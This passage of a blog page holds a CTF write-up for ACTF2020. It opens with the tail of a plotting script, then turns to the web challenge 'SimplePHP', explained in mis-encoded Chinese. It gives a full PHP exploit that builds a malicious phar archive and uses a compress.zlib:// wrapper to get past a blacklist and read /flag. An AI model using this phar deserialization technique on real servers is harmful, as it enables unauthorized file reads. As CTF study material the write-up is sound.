class="line">        dx, dy = delta[col[<span class="number">0</span>]]</span><br><span class="line">        ax.add_line(Line2D((x, x + dx), (y, y + dy), linewidth=<span class="number">1</span>, color=<span class="string">'blue'</span>))</span><br><span class="line">        dx, dy = delta[col[<span class="number">1</span>]]</span><br><span class="line">        ax.add_line(Line2D((x, x + dx), (y, y + dy), linewidth=<span class="number">1</span>, color=<span class="string">'red'</span>))</span><br><span class="line">        x += <span class="number">1</span></span><br><span class="line">    y -= <span class="number">1</span></span><br><span class="line">plt.plot()</span><br><span class="line">plt.show()</span><br></pre></td></tr></table></figure>
<h2 id="web">Web</h2>
<h3 id="simplephp">SimplePHP</h3>
<h4 id="é¢˜è§£åˆ†æ-10">[é¢˜è§£åˆ†æ]</h4>
<p>é€€å‘webæ‰‹çš„å¿ƒé…¸æ“ä½œï¼ˆx</p>
<p>è€ƒå¯Ÿpharååºåˆ—åŒ–ï¼Œ<code>highlight_file</code>å’Œ<code>file_exists</code>éƒ½èƒ½è§¦å‘ï¼Œä½†æœ‰åš<code>strtolower(substr($file,0,4))=='phar' || strtolower(substr($high_light,0,4))=='phar'</code>çš„é»‘åå•åˆ¤æ–­ï¼Œå› æ­¤ç”¨zlibç»•è¿‡.</p>
<p>pocé“¾ï¼š<code>__destruct(Sh0w) =&gt; __call(S6ow) =&gt; __get(S6ow) =&gt; file_get(S6ow) =&gt; __toString(Show)</code>.</p>
<p>å®ç°ä»»æ„æ–‡ä»¶è¯»å–ï¼ˆå­˜åœ¨ä»¥ä¸‹é»‘åå•<code>preg_match("/http|https|file:|gopher|dict|zip|php|\.\./i", $this-&gt;source)</code>ï¼‰ï¼Œä½†è¯»å–flagåªéœ€<code>file_get_contents("/flag")</code>å³å¯.</p>
<h4 id="exp-10">[exp]</h4>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Show</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $source;</span><br><span class="line">    <span class="keyword">public</span> $str;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($source)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;source = $source;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">S6ow</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $file;</span><br><span class="line">    <span class="keyword">public</span> $params;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($file, $params)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;file = $file;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;params = $params;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Sh0w</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $test;</span><br><span class="line">    <span class="keyword">public</span> $str;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($str)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;str = $str;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$params = <span class="keyword">array</span>();</span><br><span class="line">$params[<span class="string">"_show"</span>] = <span class="string">"file_get"</span>;</span><br><span class="line">$file = <span class="keyword">new</span> Show(<span class="string">"/flag"</span>);</span><br><span class="line">$o = <span class="keyword">new</span> Sh0w(<span class="keyword">new</span> S6ow($file, $params));</span><br><span class="line"></span><br><span class="line">@unlink(<span class="string">"SimplePHP.phar"</span>);</span><br><span class="line">$phar = <span class="keyword">new</span> Phar(<span class="string">"SimplePHP.phar"</span>); <span class="comment">//åç¼€åå¿…é¡»ä¸ºphar</span></span><br><span class="line">$phar-&gt;startBuffering();</span><br><span class="line">$phar-&gt;setStub(<span class="string">"&lt;?php __HALT_COMPILER(); ?&gt;"</span>); <span class="comment">//è®¾ç½®stub</span></span><br><span class="line">$phar-&gt;setMetadata($o); <span class="comment">//å°†è‡ªå®šä¹‰çš„meta-dataå­˜å…¥manifest</span></span><br><span class="line">$phar-&gt;addFromString(<span class="string">"test.txt"</span>, <span class="string">"test"</span>);</span><br><span class="line">$phar-&gt;stopBuffering();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>å°†SimplePHP.pharåç¼€åä¿®æ”¹ä¸º.jpgä¸Šä¼ ï¼Œå†åŒ…å«å³å¯.</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//actf.node.csuaurora.org:28726/file.php?high_light=compress.zlib://phar://upload/9ee4f116e740e2207acbdfc5a78c12cd.jpg&amp;file=upload/</span></span><br></pre></td></tr></table></figure>
</div><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">Author: </span><span class="post-copyright-info"><a href="mailto:undefined">0xDktb</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">Link: </span><span class="post-copyright-info"><a href="https://0xdktb.top/2020/06/06/WriteUp-ACTF2020/">https://0xdktb.top/2020/06/06/WriteUp-ACTF2020/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">Copyright Notice: </span><span class="post-copyright-info">All articles in this blog are licensed under <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank" rel="noopener">CC BY-NC-SA 4.0</a> unless stating additionally.</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/Aurora/">Aurora</a></div><div class="post_share"><div class="social-share" data-image="/img/star.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/social-share.js/dist/css/share.min.css"/><script src="https://cdn.jsdelivr.net/npm/social-share.js/dist/js/social-share.min.js"></script></div></div><div class="post-reward"><button class="reward-button"><i class="fas fa-qrcode"></i> Donate<div class="reward-main"><ul class="reward-all"><li class="reward-item"><img class="post-qr-code__img" src="/img/wx.jpg" alt="wechat" onclick="window.open('/img/wx.jpg')"/><div class="post-qr-code__desc">wechat</div></li><li class="reward-item"><img class="post-qr-code__img" src="/img/zfb.jpg" alt="alipay" onclick="window.open('/img/zfb.jpg')"/><div class="post-qr-code__desc">alipay</div></li></ul></div></button></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2020/07/06/WriteUp-SCTF2020-Crypto/"><img class="prev-cover" data-src="/img/star.jpg" onerror="onerror=null;src='/img/404.jpg'"><div class="pagination-info"><div class="label">Previous Post</div><div class="prev_info">WriteUp(SCTF2020) - Crypto</div></div></a></div><div class="next-post pull-right"><a href="/2020/05/11/Learning-of-Elliptic-Curve/"><img class="next-cover" data-src="/img/star.jpg" onerror="onerror=null;src='/img/404.jpg'"><div class="pagination-info"><div class="label">Next Post</div><div class="next_info">Learning of Elliptic Curve</div></div></a></div></nav><div class="relatedPosts"><div class="relatedPosts_headline"><i class="fas fa-thumbs-up fa-fw"></i><span> Related Articles</span></div><div class="relatedPosts_list"><div class="relatedPosts_item"><a href="/2020/04/05/WriteUp-Aurora-Mission-Impossible/" title="WriteUp(Aurora) - Mission Impossible"><img class="relatedPosts_cover" data-src="/img/star.jpg"><div class="relatedPosts_main is-center"><div class="relatedPosts_date"><i class="far fa-calendar-alt fa-fw"></i> 2020-04-05</div><div class="relatedPosts_title">WriteUp(Aurora) - Mission Impossible</div></div></a></div></div></div></article></main><footer id="footer" style="background-image: url(/img/star.jpg)" data-type="photo"><div id="footer-wrap"><div class="copyright">&copy;2019 - 2022 By 0xDktb</div><div class="framework-info"><span>Driven </span><a href="https://hexo.io" target="_blank" rel="noopener"><span>Hexo</span></a><span class="footer-separator">|</span><span>Theme </span><a href="https://github.com/jerryc127/hexo-theme-butterfly" target="_blank" rel="noopener"><span>Butterfly</span></a></div><div class="icp"><a href="http://www.beian.miit.gov.cn" target="_blank" rel="noopener"><img class="icp-icon" src="/img/icp.png"/><span>æ¹˜ICPå¤‡19022012å·</span></a></div></div></footer></div><section class="rightside" id="rightside"><div id="rightside-config-hide"><button id="readmode" title="Read Mode"><i class="fas fa-book-open"></i></button><button id="font_plus" title="Increase Font Size"><i class="fas fa-plus"></i></button><button id="font_minus" title="Decrease Font Size"><i class="fas fa-minus"></i></button><button class="translate_chn_to_cht" id="translateLink" title="Switch Between Traditional Chinese And Simplified Chinese">ç¹</button></div><div id="rightside-config-show"><button id="rightside_config" title="Setting"><i class="fas fa-cog"></i></button><button class="close" id="mobile-toc-button" title="Table Of Contents"><i class="fas fa-list-ul"></i></button><button id="go-up" title="Back To Top"><i class="fas fa-arrow-up"></i></button></div></section><div class="search-dialog" id="local-search"><div class="search-dialog__title" id="local-search-title">Local search</div><div id="local-input-panel"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="Search for Posts" type="text"/></div></div></div><hr/><div id="local-search-results"><div id="local-hits"></div><div id="local-stats"><div class="local-search-stats__hr" id="hr"><span>Powered by</span> <a href="https://github.com/wzpan/hexo-generator-search" target="_blank" rel="noopener" style="color:#49B1F5;">hexo-generator-search</a></div></div></div><span class="search-close-button"><i class="fas fa-times"></i></span></div><div class="search-mask"></div><script src="https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js"></script><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="/js/tw_cn.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js"></script><script type="text/x-mathjax-config">MathJax.Hub.Config({
  tex2jax: {
    inlineMath: [ ['$','$'], ["\\(","\\)"]  ],
    processEscapes: true,
    skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
  },
  CommonHTML: {
    linebreaks: { automatic: true, width: "90% container" }
  },
  "HTML-CSS": { 
    linebreaks: { automatic: true, width: "90% container" }
  },
  "SVG": { 
    linebreaks: { automatic: true, width: "90% container" }
  }
});
</script><script type="text/x-mathjax-config">MathJax.Hub.Queue(function() {
  var all = MathJax.Hub.getAllJax(), i;
  for (i=0; i < all.length; i += 1) {
    all[i].SourceElement().parentNode.className += ' has-jax';
  }
});
</script><script src="https://cdn.jsdelivr.net/npm/mathjax/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><script src="https://cdn.jsdelivr.net/npm/instant.page/instantpage.min.js" type="module" defer></script><script src="https://cdn.jsdelivr.net/npm/vanilla-lazyload/dist/lazyload.iife.min.js" async></script><script src="/js/search/local-search.js"></script></body></html>